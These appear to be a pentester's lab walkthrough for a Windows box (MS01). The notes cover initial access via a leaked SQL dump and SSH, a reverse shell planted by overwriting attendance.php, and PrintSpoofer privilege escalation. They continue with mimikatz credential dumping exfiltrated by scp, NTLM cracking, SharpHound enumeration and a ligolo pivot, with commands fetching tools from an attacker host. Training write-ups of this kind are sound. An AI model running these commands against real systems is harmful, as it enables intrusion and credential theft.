# MS01
- IP 192.168.198.141
- Eric.Wallows : EricLikesRunning800
- Feroxbuster for a SQL DB
 ```bash
http://192.168.198.141:81/DB/apsystem.sql

Neovic', 'Devierte'
1 : nurhodelta : $2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK 
```
- Logged in via SSH on port 22
- Enumerated with Winpeas
- File permissions on the Webserver directory : 
	- c:\wamp64(Authenticated Users [Allow: WriteData/CreateFiles])
- This directory has the attendance.php file we saw in use on the port 81 site
- Downloaded a rev shell and replaced this file with our own ,
	- `curl.exe http://192.168.45.190/attendance.php -o attendance.php`
- 
- Navigated to attendance site : http://192.168.198.141:81/, signed in
- Revshell popped
- new user ms01\mary.williams
* new privilege is SeCreateGlobalPrivilege  
* https://github.com/itm4n/PrintSpoofer
	* syntax : .\printspoof.exe -i -c cmd
* Voila, we are now system!

## Export creds

```powershell
log c:\wamp\mk\sam.log  # start logging
.\mimikatz.exe
privilege::debug 
token::elevate   # elevate to SYSTEM user privileges.
lsadump::sam 
sekurlsa::logonpasswords  attempts to extract plaintext passwords and password hashes from all available sources.
log # stop loggin
scp *.log kali@192.168.45.190:~/Documents/Boxes/


# Cracking NTLM with john and hashcat
john --wordlist=$rockyou --rules=best64 ntlm.hash --format=NT  
hashcat -m 1000 ntlm.hash $rockyou -r /usr/share/hashcat/rules/best64.rule --force

john ntlm.hash --show --format=NT


support:Freedom1
Administrator:December31

```

## Enumerate with Bloodhound/sharphound
```bash
cp /usr/share/sharphound/SharpHound.ps1 .


curl.exe http://192.168.45.190/SharpHound.ps1 -o sharphound.ps1
iwr -uri http://192.168.45.190/SharpHound.ps1 -Outfile SharpHound.ps1

powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All # must be run as domain user, not Local Admin
## once finished, locate .zip file, transfer back to kali

scp *.zip kali@192.168.45.190:~/Documents/Boxes/

#update-bloodhound-ce
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart

wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
# “Docker is installed on this system, but the daemon is not running” In case you get the error message, you need to uninstall and re-install Docker.
# Simply launch Docker Desktop and proceed.
sudo systemctl start docker    
sudo ./bloodhound-cli install


[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: ucMBeGC75nRmTE7b2sMK4LpGHBw7jmWG
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
 
Bloodhound12!@


```

## Pivot
``` bash
curl.exe http://192.168.45.210/ligolo_agent.exe -o agent.exe
./agent.exe -connect 192.168.45.210:11601 -ignore-cert

session # KALI
autoroute
select subnet/route you want access to
create a new interface, start tunnel
```
